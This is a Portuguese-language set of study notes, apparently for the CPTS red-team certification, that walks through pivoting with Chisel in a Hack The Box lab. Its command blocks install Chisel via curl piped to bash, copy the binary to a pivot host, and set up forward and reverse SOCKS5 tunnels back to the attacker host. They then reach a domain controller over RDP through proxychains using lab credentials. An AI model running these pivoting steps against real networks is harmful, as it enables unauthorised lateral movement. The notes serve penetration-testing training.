> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/chisel.md).

# Chisel

[Chisel](https://github.com/jpillora/chisel) é uma ferramenta de tunelamento baseada em TCP/UDP escrita em [Go](https://go.dev/) que usa HTTP para transportar dados protegidos usando SSH.&#x20;

* **Cloning Chisel**

```sh
curl https://i.jpillora.com/chisel! | bash
```

* **Binario**

```sh
ln -s /usr/local/bin/chisel chisel
```

* **Transferindo o Chisel Binary para o Pivot Host**

```sh
scp chisel ubuntu@10.129.202.64:~/
```

* **Executando o Chisel Server no Pivot Host**

```sh
./chisel server -v -p 1234 --socks5
```

* **Conectando ao servidor Chisel**

```sh
./chisel client -v 10.129.202.64:1234 socks
```

* **Editando e confirmando proxychains.conf**

```sh
Akira20@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

* **Pivotando para o DC**

```sh
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

***

### Chisel Reverse Pivot

* **Iniciando o Chisel Server em nosso Host de Ataque (kali)**

```sh
sudo ./chisel server --reverse -v -p 1234 --socks5
```

* **Conectando o Chisel Client ao nosso Host de Ataque (ubuntu)**

```sh
./chisel client -v 10.10.14.17:1234 R:socks
```

* **Editando e confirmando proxychains.conf**

```sh
Akira20@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

* Se usarmos proxychains com RDP, podemos nos conectar ao DC na rede interna através do túnel que criamos para o host Pivot.

```sh
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

[How To Pivot Through a Network with Chisel](https://www.youtube.com/watch?v=pbR_BNSOaMk) - **John Hammond**
